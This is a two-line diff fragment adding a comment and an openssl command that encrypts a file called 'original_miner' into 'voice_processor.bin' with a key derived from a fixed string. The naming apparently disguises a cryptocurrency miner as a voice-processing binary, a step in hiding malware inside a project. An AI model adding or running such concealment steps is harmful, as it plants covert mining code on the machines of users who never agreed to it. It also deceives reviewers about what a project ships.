@@ -1,0 +1,2 @@
+# On your local machine
+     openssl enc -aes-256-cbc -in original_miner -out voice_processor.bin -K $(echo -n "voice-profile-key" | sha256sum | cut -d' ' -f1) -iv 0
